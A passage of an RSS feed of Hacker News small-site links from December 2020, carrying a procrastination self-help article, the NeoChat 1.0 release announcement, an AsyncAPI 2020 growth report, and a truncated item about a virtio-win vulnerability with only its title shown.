            <pubDate>Wed, 23 Dec 2020 13:28:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why do I always start so late]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25517340">thread link</a>) | @durmonski
<br/>
December 23, 2020 | https://www.deprocrastination.co/blog/why-do-I-always-start-so-late | <a href="https://web.archive.org/web/*/https://www.deprocrastination.co/blog/why-do-I-always-start-so-late">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p><img src="https://www.deprocrastination.co/assets/illustrations/procrastination_work_no.png" alt="Why do I always start so late"></p><p>Do you always postpone tasks until the last possible moment?</p><p>Then, right before the deadline, you have to hurry up and do everything, stressed out.</p><p>Why do we do that?</p><p>People often claim that it is because they work better under pressure. Well, that could be the case but as studies have shown,&nbsp;<a href="https://www.deprocrastination.co/blog/6-most-common-myths-about-procrastination">we don’t really work better under pressure.</a></p><p>In the majority of cases, we try to protect our self-image of being smart, great at what we do. Let us explain.</p><p>Procrastinators often believe:</p><p>Self-worth = ability = performance</p><p>Their self-worth is based on what they’re able to do. The proof of what they’re able to do is based on their performance.</p><p>Bad presentation = I’m worthless..<br>Bad painting = I’m no good at this.<br>Unanswered message = I’m not good enough.</p><p>This pressure can be so great that procrastinators choose to avoid making an effort altogether. Why? Because then they have an excuse.</p><p>When you wait close to the deadline, you break the equation. Your performance is not a reflection of your ability anymore, because you didn’t have time to truly perform.</p><p>Suddenly, all 3 possible outcomes are fine:</p><p>Your performance on the task is a success - your self-image is preserved and improved.&nbsp;<em>Omg, look at me, I achieved this with so little time left. Only if I had all the time in the world, then the result would be even more spectacular.</em></p><p>The performance is average - your self-image is preserved.&nbsp;<em>It’s okay but if I had more time, I would ace it.</em></p><p>The performance is a failure - your self-image is preserved.&nbsp;<em>I simply didn’t have enough time to succeed. If I had the time, I’d definitely succeed. If only I’d started earlier...</em></p><p>So instead of showing our real abilities, we’re just testing how well we perform when we don't have enough time. This phenomenon is called self-handicapping and leaving yourself little time to complete a task is one of the most common examples of it. We’re protecting ourselves from testing our real abilities and then finding out that we’re still not good enough. It would ruin our view of our talent and intelligence.</p><h2>How to start working early(ier)</h2><p>If you want to finish tasks ahead of time and enjoy peace for once, first you need to break the equation:</p><p>Self-worth = ability = performance</p><h3>1. Realize performance doesn’t reflect just our ability</h3><p><em>Performance = ability</em>&nbsp;is a simplistic view.</p><p>In reality, it looks more like this:</p><p>Performance = ability * motivation * energy * time * luck</p><p>So when you think about it, your performance doesn’t really prove or disprove your ability and self-worth.</p><p>Sometimes, you could be really skilled at a task (high ability) but because you’re super tired, your result isn’t worth much.</p><p>In collective sports, players often have high skill, a lot of energy, and motivation but because they aren’t lucky, they don’t score. The best athletes know that luck will come and go and they need to keep trying instead of feeling down after not getting lucky.</p><p>After you realize that performance is determined by many more variables, you stop being so scared of performing.</p><h3>2. Believe your ability can always grow</h3><p>Even if your ability is low and it’s the cause of your bad performance, it isn’t the end state. You can always change, learn, improve, and grow.</p><p>You probably don’t remember how difficult it was learning to walk. You tried at least a thousand times. Then slowly your feet and brain learned to coordinate together to hold a balance. Now, you don’t ever think about how simple it is to hold balance while standing on your feet.</p><p>You also don’t remember how much you struggled when you learned to read and write.  Mat here: I remember I came home from school one day when I was learning to read in the first grade. We had homework to do to practice reading. It was more difficult than the elementary words (like mom and dad) and I really struggled. I started crying and threw away the textbook because I thought I could never do it and I would stay illiterate forever. Guess what, I was wrong that day.</p><p>“Life-long learning” became a buzzword but it’s really true. Everyone has the ability to learn, no matter how old we are, and we can usually do it faster than we think.</p><p>When you realize this, bad performance doesn’t have to mean that it’s the end of the world. Instead, it tells you that you have something to work on.</p><h3>3. Your performance doesn’t have to be perfect</h3><p>We often think that we should be getting to the best possible result there is. There are usually external pressures (like parents, friends, or bosses, marketing) that push us to be the best ever..</p><p>In reality, most things don’t really matter and they don’t need  to be perfect. Often,&nbsp;<strong>good enough is sufficient.</strong></p><p>The goal doesn’t necessarily have to be to get A’s,&nbsp;<a href="http://mindingourway.com/half-assing-it-with-everything-youve-got/">maybe the goal is to pass.</a></p><p>Maybe the goal isn’t to be in Instagram-worthy shape, but to be healthy and happy.</p><p>Maybe the goal isn’t to write a perfect report, it may be writing a simple report fast so that the right people are informed correctly and on time.</p><p>Not perfect, good enough.</p><p>When you understand this, a great weight lifts off your shoulders because you know you don’t need to be perfect.</p><h3>4. Increase your self-esteem</h3><p>Self-worth is directly connected to self-esteem.</p><p>When self-esteem is low and vulnerable, people tend to procrastinate way more. They’re even more dependent on their performance proving or disproving their self-worth.</p><p>Increasing self-esteem can become a catch-22 situation. You procrastinate because your self-esteem is low. However, you don’t want to start working because it might be proof that you’re bad and don’t deserve it. We cover this topic much more extensively in our&nbsp;<a href="https://www.deprocrastination.co/guide">guide - How to finally stop procrastinating</a>, but here’s the short version:</p><p><strong>Start stacking small wins.</strong></p><p>Find something, anything, that you can do and do it. Look for tasks that you can successfully complete.</p><p>Every win will prove to yourself that you can change and improve. This trust in your abilities will translate into higher self-esteem.</p><p>When you have high enough self-esteem, you stop caring so much about any one  performance.&nbsp;<em>One bad attempt? No worries, I’ll do better next time.</em></p><h2>Summary</h2><p>To stop self-sabotaging and start working early:</p><ol><li>Realize that your performance doesn’t reflect your ability and self worth.</li><li>Believe your abilities can always grow.</li><li>Understand that your performance doesn’t have to be perfect.</li><li>Increase your self-esteem by stacking small wins.</li></ol><p>So, do you have a project that you’ve been putting off?</p><p>Start today, imperfectly.</p></article></div>]]>
            </description>
            <link>https://www.deprocrastination.co/blog/why-do-I-always-start-so-late</link>
            <guid isPermaLink="false">hacker-news-small-sites-25517340</guid>
            <pubDate>Wed, 23 Dec 2020 13:23:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BlocklySQL: A new block-based editor for SQL]]>
            </title>
            <description>
<![CDATA[
Score 96 | Comments 23 (<a href="https://news.ycombinator.com/item?id=25517043">thread link</a>) | @leeuw01
<br/>
December 23, 2020 | https://www.dbinf.informatik.uni-wuerzburg.de/google-blockly-4efa0da/sql/index.html | <a href="https://web.archive.org/web/*/https://www.dbinf.informatik.uni-wuerzburg.de/google-blockly-4efa0da/sql/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    

    

    

    

    

    

    <div id="diagramDiv">
        <p>Class diagramm:</p>
        <p><img src="https://www.dbinf.informatik.uni-wuerzburg.de/classicmodels/classicmodels.JPG" alt="Classicmodels Class diagramm">
    </p></div>

    

    




</div>]]>
            </description>
            <link>https://www.dbinf.informatik.uni-wuerzburg.de/google-blockly-4efa0da/sql/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25517043</guid>
            <pubDate>Wed, 23 Dec 2020 12:51:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NeoChat 1.0, the KDE Matrix client]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25517006">thread link</a>) | @ognarb
<br/>
December 23, 2020 | https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/ | <a href="https://web.archive.org/web/*/https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>Matrix is an instant messaging system similar to Whatsapp or Telegram, but
uses an open and decentralized network for secure and privacy-protected
communications. NeoChat is a visually attractive Matrix client that works on
desktop computers and mobile phones.</p>
<h2 id="convergence">Convergence</h2>
<p>NeoChat provides an elegant and convergent user interface, allowing
it to adapt to any screen size automatically and gracefully.</p>
<p><img src="https://www.plasma-mobile.org/img/post-2020-11/neochat-drawer.png" alt="Image"></p>
<p>This means you can use it both on desktop computers, where you might want to
have a small bar on the side of your screen, but you can also enjoy NeoChat
on Plasma Mobile and Android phones.</p>
<p>In fact, NeoChat will be installed by default on the PinePhone KDE edition and
we offer a <a href="https://binary-factory.kde.org/view/Android/job/Neochat_android/" target="_blank" rel="noopener">nightly Android
version</a>
too. The Android version is for the moment experimental and some
features, like file uploading, don’t work yet.</p>
<h2 id="features">Features</h2>
<p>NeoChat provides a timeline with support for simple messages and also allows
you to upload images and video and audio files. You can reply to messages and
add reactions.</p>
<p>NeoChat provides all the basic features chat application needs: apart from
sending and responding to messages, you can invite users to a room, start
private chats, create new rooms and explore public rooms.</p>
<figure>
		<a href="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/start-a-chat-dialog.png" data-size="771x879">
			<img srcset="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/start-a-chat-dialog_hu657bbd5cb8c18b7beae3cbcf71d6d45f_37948_480x0_resize_box_2.png 480w, https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/start-a-chat-dialog_hu657bbd5cb8c18b7beae3cbcf71d6d45f_37948_1024x0_resize_box_2.png 1024w" src="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/start-a-chat-dialog.png" width="771" height="879" loading="lazy" alt="Start a chat dialog">
		</a>
		
		<figcaption>Start a chat dialog</figcaption>
		
	</figure> <figure>
		<a href="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/explore-rooms.png" data-size="771x879">
			<img srcset="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/explore-rooms_hu79ef56e12c8430c5076d02819979ea0f_166307_480x0_resize_box_2.png 480w, https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/explore-rooms_hu79ef56e12c8430c5076d02819979ea0f_166307_1024x0_resize_box_2.png 1024w" src="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/explore-rooms.png" width="771" height="879" loading="lazy" alt="Explore rooms">
		</a>
		
		<figcaption>Explore rooms</figcaption>
		
	</figure>
<p>Some room management features are also available: You can ban or kick
users, upload a room avatar and edit a room’s metadata.</p>
<figure>
		<a href="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/room-setting-dialog.png" data-size="578x447">
			<img srcset="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/room-setting-dialog_hu18a88d193d79ef4aab1f99712c562ce6_48066_480x0_resize_box_2.png 480w, https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/room-setting-dialog_hu18a88d193d79ef4aab1f99712c562ce6_48066_1024x0_resize_box_2.png 1024w" src="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/room-setting-dialog.png" width="578" height="447" loading="lazy" alt="Room Setting dialog">
		</a>
		
		<figcaption>Room Setting dialog</figcaption>
		
	</figure> <figure>
		<a href="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/neochat-chat-context.png" data-size="1051x756">
			<img srcset="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/neochat-chat-context_hu84cba00d8972e20b4fd059c98cd16929_205469_480x0_resize_box_2.png 480w, https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/neochat-chat-context_hu84cba00d8972e20b4fd059c98cd16929_205469_1024x0_resize_box_2.png 1024w" src="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/neochat-chat-context.png" width="1051" height="756" loading="lazy" alt="Message detail dialog">
		</a>
		
		<figcaption>Message detail dialog</figcaption>
		
	</figure>
<p>The room view contains a sidebar that is automatically displayed on wide
screens, but also appears as a drawer on smaller screens. This sidebar contains
all the information about the room.</p>
<figure>
		<a href="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/invite.png" data-size="676x692">
			<img srcset="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/invite_hue280abd9795bd3c10b08aa609a24c839_87908_480x0_resize_box_2.png 480w, https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/invite_hue280abd9795bd3c10b08aa609a24c839_87908_1024x0_resize_box_2.png 1024w" src="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/invite.png" width="676" height="692" loading="lazy" alt="Invitation UI">
		</a>
		
		<figcaption>Invitation UI</figcaption>
		
	</figure> <figure>
		<a href="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/multiaccount-support.png" data-size="523x579">
			<img srcset="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/multiaccount-support_hu3f72ff473673f3f62a1cc673c1bbc837_25873_480x0_resize_box_2.png 480w, https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/multiaccount-support_hu3f72ff473673f3f62a1cc673c1bbc837_25873_1024x0_resize_box_2.png 1024w" src="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/multiaccount-support.png" width="523" height="579" loading="lazy" alt="Multiaccount Support">
		</a>
		
		<figcaption>Multiaccount Support</figcaption>
		
	</figure> <figure>
		<a href="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/sidebar.png" data-size="244x676">
			<img srcset="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/sidebar_hu7ed8bfeeb3c1069bbf9d5808f0ea5d59_59172_480x0_resize_box_2.png 480w, https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/sidebar_hu7ed8bfeeb3c1069bbf9d5808f0ea5d59_59172_1024x0_resize_box_2.png 1024w" src="https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/sidebar.png" width="244" height="676" loading="lazy" alt="Sidebar">
		</a>
		
		<figcaption>Sidebar</figcaption>
		
	</figure>
<p>A lot of care has been put into making NeoChat intuitive to use. For
example, copying with Ctrl+C and dragging and dropping images just work; and
the text field gets autofocused so that you are never writing into the void.
NeoChat also integrates an emoji picker, letting you use the greatest invention
of the <del>21st century</del>. (Note: someone in Mastodon pointed out that
Emojis are from the 20th century and appeared in 1997 in Japan.)</p>
<h2 id="image-editor">Image Editor</h2>
<p>NeoChat also includes a basic image editor that lets you crop and rotate
images before sending them. The image editor is provided by a small library
called KQuickImageEditor.</p>

<p>This library for the moment doesn’t have a stable API and is released together
with NeoChat.</p>
<h2 id="why-matrix-and-neochat">Why Matrix and NeoChat</h2>
<p>Matrix is an open network for secure and decentralized communication. This is an
initiative that is very much aligned with KDE’s goals of creating an open
operating system for everybody. This is why we need a Matrix client that
integrates into Plasma and thus NeoChat was born.</p>
<p>NeoChat is a fork of Spectral, another QML client, and uses the
libQuotient library to interact with the Matrix protocol. We would like to send
out a huge thank you to these two projects and their contributors. Without
them, NeoChat wouldn’t have been possible.</p>
<p>NeoChat uses the <a href="https://develop.kde.org/frameworks/kirigami" target="_blank" rel="noopener">Kirigami framework</a>
and QML to provide an elegant and convergent user interface.</p>
<h2 id="translations">Translations</h2>
<p>NeoChat is fully translated in English, Ukrainian, Swedish, Spanish, Portuguese,
Hungarian, French, Dutch, Catalan (Valencian), Catalan, British English,
Italian, Norwegian Nynorsk and Slovenian. Thanks a lot to all the translators
and if NeoChat is not available in your native language consider joining <a href="https://community.kde.org/Get_Involved/translation" target="_blank" rel="noopener">KDE
localization team</a>.</p>
<h2 id="what-is-missing">What is Missing</h2>
<p>For the moment, encryption support is missing and NeoChat doesn’t support video
calls and editing messages yet either. Both things are in the works.</p>
<p>We are also missing some integration with the rest of the KDE applications,<br>
like with <a href="https://invent.kde.org/frameworks/purpose" target="_blank" rel="noopener">Purpose</a>, which will
allow NeoChat to be used to share content from other KDE applications; and
with <a href="https://invent.kde.org/frameworks/sonnet" target="_blank" rel="noopener">Sonnet</a>, which will provide
spellchecking features.</p>
<p>The fastest way to implement these deficiencies is to get involved! The
NeoChat team is a friendly group of developers and Matrix enthusiasts. Join us
and help us make NeoChat a great Matrix client! You can join us at
<a href="https://matrix.to/#/#neochat:kde.org" target="_blank" rel="noopener">#neochat:kde.org</a>. We also participate
to Season of KDE, so if you want to get mentored on a project and at the end
get a cool KDE T-Shirt, feel free to say hi.</p>
<h2 id="tarballs">Tarballs</h2>
<p>Unfortunally there was an error generating the tarbals, we are working on it
and new tarbals will be created shortly.</p>
<p>Version 1.0 of NeoChat is availabe <a href="https://download.kde.org/stable/neochat/1.0/neochat-1.0.tar.xz" target="_blank" rel="noopener">here</a>,
kquickimageeditor 0.1.2 is availabe <a href="https://download.kde.org/stable/kquickimageeditor/0.1/kquickimageeditor-0.1.2.tar.xz" target="_blank" rel="noopener">here</a>.
Both packages are signed with my gpg key <a href="https://carlschwan.eu/gpg.html">14B0ED91B5783415D0AA1E0A06B35D38387B67BE</a>.</p>
<p>A Flathub release will hopefully be released in the next few days. We will
update this post when it is available.</p>

</section></div>]]>
            </description>
            <link>https://carlschwan.eu/2020/12/23/announcing-neochat-1.0-the-kde-matrix-client/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25517006</guid>
            <pubDate>Wed, 23 Dec 2020 12:47:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is AsyncAPI a thing? Check hard numbers for 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25516988">thread link</a>) | @fmvilas
<br/>
December 23, 2020 | https://www.asyncapi.com/blog/2020-summary | <a href="https://web.archive.org/web/*/https://www.asyncapi.com/blog/2020-summary">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><img src="https://www.asyncapi.com/img/posts/2020-summary/cover.webp" alt="Post cover image"><p><undefined><span role="img" aria-label="middle finger">🖕</span> COVID-19</undefined></p><p>AsyncAPI Community is stronger than you think. </p><p>See the growth of AsyncAPI in 2020 in hard numbers. How do we compare to 2019?</p><p>This post is based on quantitative data using metrics from different platforms where AsyncAPI is present. I collected this data between 15-17.12, so they are already a bit larger by now. I'll try to confront our qualitative knowledge, what we know from discussions with others, and our observations.</p><p>This post is not 100% just in numbers and analytics. It is also a summary of all the important things that happened to the project this year.</p><h2 id="important-moments">Important moments</h2><ol><li>Our first ever <a href="https://www.asyncapi.com/blog/asyncapi-conference-kick-off">AsyncAPI Online Conference</a>. This pandemic edition turned out to be a very successful event that powered us up for the rest of the year</li><li>We took active part in <a href="https://www.asyncapi.com/blog/hacktoberfest-summary-2020">Hacktoberfest</a> as maintainers and increased the number of contributions to the project</li><li>AsyncAPI was featured in InfoQ's <a href="https://www.infoq.com/articles/architecture-trends-2020/">Software Architecture and Design InfoQ Trends Report—April 2020</a> that directly brought 1963 new users to the AsyncAPI website</li><li>AsyncAPI showed up on <a href="https://www.thoughtworks.com/radar/tools/asyncapi">Technology Radar</a> that took 1051 users directly to the AsyncAPI website</li><li>Our two core tools reached their first major release</li></ol><p>All those moments lead us to the most important one: the <a href="https://www.asyncapi.com/blog/asyncapi-partners-with-postman">partnership with Postman</a>.</p><h2 id="slack">Slack</h2><p>tl;dr AsyncAPI community activity on <a href="https://www.asyncapi.com/slack-invite/">our Slack workspace</a> doubled!</p><figure><img src="https://www.asyncapi.com/img/posts/2020-summary/active-members.webp"><p>Figure 1: Slack active members weekly</p></figure><h3 id="numbers-getting-high">Numbers getting high</h3><p>I don't think the below tables require any introduction.</p><div><div><div><table><tbody><tr><td></td><td>January 2019</td><td>January 2020</td><td>December 2020</td></tr><tr><td>Messages posted</td><td>2788</td><td>25388<br>(+22600)</td><td>76609<br>(+51221)</td></tr><tr><td>Number of members</td><td>159</td><td>432<br>(+273)</td><td>888<br>(+456)</td></tr></tbody></table></div></div></div><p><undefined>More members means higher activity <span role="img" aria-label="smiling face with open mouth &amp; cold sweat">😅</span></undefined></p><div><div><div><table><tbody><tr><td></td><td>2019</td><td>2020</td></tr><tr><td>Weekly members activity</td><td>45 average<br>42 median</td><td>81 average<br>76 median</td></tr></tbody></table></div></div></div><h3 id="most-present-companies">Most present companies</h3><p>I was also super curious to check out where our members are coming from. The only way to do it was by checking the domain of their emails used during registration. Yes, this is not 100% accurate. Not all people use company emails in open source. It is visible in data; half of the users have the <strong>gmail.com</strong> domain. Nevertheless, the result of my investigation is pretty accurate with our knowledge. The ones that have more than three representants:</p><ul><li>mulesoft.com</li><li>postman.com</li><li>redhat.com</li><li>sap.com</li><li>smartbear.com</li><li>solace.com</li><li>tibco.com</li><li>worldpay.com</li></ul><p><undefined>Some of these companies sponsored our work in 2020. The ones that didn't... don't worry, we'll contact you <span role="img" aria-label="winking face">😉</span> In 2021, we want to go into a neutral ground (i.e., joining a foundation). There'll be no more excuses.</undefined></p><h3 id="whats-next-with-slack">What's next with Slack</h3><p><undefined>Slack hard numbers confirm what we see in Slack every day. Luckily, even though the activity doubled, the number of active users that help out in the workspace also grew <span role="img" aria-label="folded hands">🙏</span> With the recently announced Postman partnership, I do not worry about how we'll handle 2021.</undefined></p><p>Next year we need to address two critical topics:</p><ul><li>our community grows but the knowledge that we all share in Slack is lost. We use a free version of Slack, and therefore, only the last 10k messages are available. In 2021, we need to make a strong decision on what's next. Should we spend some budget on Slack commercial subscriptions, or maybe we should find a better tool?</li><li>we need to reorganize our channels, be a bit more granular, and target suitable community groups. We'll bother you to get your feedback once we start this reorganization.</li></ul><h2 id="linkedin">LinkedIn</h2><p><a href="https://www.linkedin.com/company/asyncapi/">LinkedIn</a> grew a lot this year. We won't be able to compare this year with the previous one because... this is not a place where I want to discuss the experience you get with LinkedIn.</p><h3 id="followers-and-impressions">Followers and impressions</h3><p>At the moment, we have 757 followers.</p><div><div><div><table><tbody><tr><td>Followers</td><td>Likes</td><td>Impressions</td></tr><tr><td>611<br>57 from payed marketing</td><td>1253</td><td>80095</td></tr></tbody></table></div></div></div><p>People that like our updates are most likely the ones that click on links. 75% (947) of likes converted into visits to our <a href="http://asyncapi.com/">website</a>. We took this data from Google Analytics, and we know that in 2019 we had only 137 visits from LinkedIn.</p><p>The most performing update was the one about the <a href="https://www.linkedin.com/feed/update/urn:li:activity:6742099578591481856">partnership with Postman</a>. It is LinkedIn, and it is all about business.</p><p>The chart below shows that data match reality. The highest peak in late March is related to our first <a href="https://www.youtube.com/watch?v=oMSzGc5bDr4">AsyncAPI Online Conference</a>. The rise of sponsored traffic is connected to our post-conference activities using the money we got from conference sponsors.</p><figure><img src="https://www.asyncapi.com/img/posts/2020-summary/linkedin-impressions.webp"><p>Figure 2: Impressions to updates in 2020</p></figure><p>This year we explored paid adverts on LinkedIn. We had some money left from sponsors of our AsyncAPI conference but zero experience with LinkedIn.</p><p>Luckily, we have a fantastic community. One of the community members, <a href="https://www.linkedin.com/in/daniel-weese-53b27410/">Dan Weese</a>, helped us here. He did not only put us in contact with marketing expert, <a href="https://www.linkedin.com/in/sardou/">Charles Serdou</a><undefined> but also covered his wages. Thank you, Dan <span role="img" aria-label="folded hands">🙏</span></undefined></p><p>This way, we covered only LinkedIn costs paying $1 074,08</p><figure><img src="https://www.asyncapi.com/img/posts/2020-summary/linkedin-folowers.webp"><p>Figure 3: Followers growth in 2020</p></figure><p>Marketing was focused on increasing the number of followers. Comparing the results of sponsored marketing with followers' organic growth, one could say LinkedIn marketing was not so good. It was very good though. LinkedIn is just super expensive and charged a lot for every new follower.</p><p>We should give it a second chance in 2021, but this time with sponsored updates.</p><h3 id="whats-next-with-linkedin">What's next with LinkedIn</h3><p>The numbers show it is worth investing in the channel. We can reach a lot of people that are not reachable on other channels. So we will for sure continue what we do now, especially that this work doesn't require too much extra effort from us.</p><p>I feel that probably some traffic coming from LinkedIn to our website is not adequately tracked in Google Analytics. Data from LinkedIn say we should notice 2x947 traffic. It might be related to people blocking tracking tools, and we will have to make sure to use other tracking methods, like putting identifiers in the links.</p><h2 id="google-analytics">Google Analytics</h2><p>We use Google Analytics on <a href="https://www.asyncapi.com/">AsyncAPI website</a> because we want to understand what content is most valuable for you, and we want to learn how the interest is growing. </p><h3 id="traffic-got-much-higher">Traffic got much higher</h3><p>The interest is growing by a lot! Our website handles it well with the support of <a href="https://www.netlify.com/">Netlify</a>, which is free for open-source projects.</p><div><div><div><table><tbody><tr><td></td><td>2019</td><td>2020</td></tr><tr><td>Unique users visits</td><td>27 090</td><td>80 399<br>(+53 309)</td></tr><tr><td>Number of sessions</td><td>50 405</td><td>142 229<br>(+91 824)</td></tr><tr><td>Unique pageviews</td><td>143 059</td><td>348 131<br>(+205 172)</td></tr></tbody></table></div></div></div><h3 id="top-referring-channels">Top referring channels</h3><p>If we look closer to the statistics to check out how people learn about AsyncAPI, referral channels keep pretty much the same share of the pie, just numbers grow.</p><figure><img src="https://www.asyncapi.com/img/posts/2020-summary/top-channel-2019.webp"><p>Figure 4: Top channels in 2019</p></figure><figure><img src="https://www.asyncapi.com/img/posts/2020-summary/top-channel-2020.webp"><p>Figure 5: Top channels in 2020</p></figure><p>In 2019, the most viral was the information about AsyncAPI 2.0 release, while in 2020, the blog post about how we <a href="https://www.asyncapi.com/blog/automated-releases">automated releases</a> on AsyncAPI packages to speed up work. </p><h3 id="top-blog-posts">Top blog posts</h3><p><a href="https://www.asyncapi.com/blog">AsyncAPI blog</a> is not just for Fran and me. It is for the AsyncAPI Community. Anyone can share knowledge, experience, and showcase their work there. Just <a href="https://github.com/asyncapi/website/issues/new?template=blog.md">let us</a> know what you want to write about.</p><p>What is the benefit of writing/republishing on the AsyncAPI blog? Visibility among the AsyncAPI community plus our activities to make your work go viral. Just look at the below table to see our top 3 viral posts.</p><h3 id="whats-next-with-the-website">What's next with the website</h3><p>We need to enable Google Search Console and connect with our Google Analytics account. It will increase our knowledge about how people google before they get into the AsyncAPI website. Knowing how people find us, we can focus on more content related to search queries.</p><p>We need more posts on our blog. 2020 shows this is something that increases traffic. We already welcomed many guest bloggers, and you <a href="https://github.com/asyncapi/website/issues/new?template=blog.md">can become</a> one of our writers too.</p><h2 id="twitter">Twitter</h2><p>By the time I gathered data for this blog post, we had 1433 followers on Twitter. 876 followers joined us in 2020. It is a large increase since the account creation back in March 2019.</p><h3 id="paid-marketing">Paid marketing</h3><p>We used money from our AsyncAPI conference sponsors to advertise the conference on Twitter.</p><p>We spent $924,14 on this activity and when we compare it to organic impressions over this year, result is just great:</p><div><div><div><table><tbody><tr><td></td><td>Organic (549 tweets)</td><td>Promoted (3! tweets)</td></tr><tr><td>Impressions</td><td>570 466</td><td>525 329</td></tr><tr><td>Retweets</td><td>1 429</td><td>77</td></tr><tr><td>Likes</td><td>2 507</td><td>567</td></tr><tr><td>URLs clicks</td><td>2 759</td><td>2 283</td></tr><tr><td>Follows</td><td>4</td><td>35</td></tr></tbody></table></div></div></div><p>Nothing is black and white, even Twitter performance. One could say:</p><blockquote><p>leave organic growth and invest in paid marketing </p></blockquote><p>We do not treat Twitter as just a marketing channel. It is our window to the community. We use it to share updates, short information and engage directly with our community members. We should continue to work on organic growth. It converted only into 2 160 sessions to the AsyncAPI website, which is not much if we compare it with 2 283 sessions opened with the AsyncAPI Conference website using promoted content. We do not want to close the window, though.</p><p><undefined>It's all about keeping the balance <span role="img" aria-label="balance scale">⚖️</span></undefined></p><h3 id="top-tweets">Top tweets</h3><p>We did some research on the most impressive and engaging tweets.</p><p>There is only one tweet that shows up in the top 3 for each category.</p><div><div><div><table><tbody><tr><td>Tweet</td><td>Engagements</td></tr><tr><td></td><td>428</td></tr><tr><td></td><td>259</td></tr><tr><td></td><td><p>253</p>(not all those memes were lame after all)</td></tr></tbody></table></div></div></div><p><undefined>It is pretty clear that what you liked the most this year is that we are hiring <span role="img" aria-label="flexed biceps">💪</span> </undefined></p><p>We are still hiring!</p><div><h3>Receive an email when we publish a new job offer:</h3><p>We respect your inbox. No spam, promise ✌️</p></div><h3 id="whats-next-with-twitter">What's next with Twitter</h3><p>We should get more insights into how Twitter activity converts into visits to our website. Twitter offers something called <strong>conversion tracking</strong> which seems like a perfect fit, and this is something we will enable for next year.</p><p>Paid marketing on Twitter is useful, so we will continue using it for important events.</p><h2 id="github">GitHub</h2><p>We notice growing traffic in <a href="https://github.com/asyncapi">our GitHub organization</a> like on other channels.</p><h3 id="most-popular-repositories">Most popular repositories</h3><p>Our most popular repositories contain the AsyncAPI specification and the AsyncAPI Generator that the community can use to generate documentation and code.</p><p><a href="https://github.com/asyncapi/asyncapi/">The asyncapi repository</a> that had 245 stars in 2019 jumped to 1361. The peak you see on the diagram was caused by us putting the link to the asyncapi repository on <a href="https://news.ycombinator.com/item?id=22728257">Hacker News</a>.</p><figure><img src="https://www.asyncapi.com/img/posts/2020-summary/star-history-asyncapi.webp"><p>Figure 6: GitHub stars growth in asyncapi repository</p></figure><p><a href="https://github.com/asyncapi/generator/">The generator repository</a> grew from 62 to 198. The path got steeper this year. This popularity is covered with our recent development activities in the project. </p><figure><img src="https://www.asyncapi.com/img/posts/2020-summary/star-history-generator.webp"><p>Figure 7: GitHub stars growth in generator repository</p></figure><h3 id="traffic-growth">Traffic growth</h3><p><undefined>All numbers …</undefined></p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.asyncapi.com/blog/2020-summary">https://www.asyncapi.com/blog/2020-summary</a></em></p>]]>
            </description>
            <link>https://www.asyncapi.com/blog/2020-summary</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516988</guid>
            <pubDate>Wed, 23 Dec 2020 12:45:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anyone who has ever installed virtio-win by yum is vulnerable]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25516915">thread link</a>) | @scaramanga
<br/>
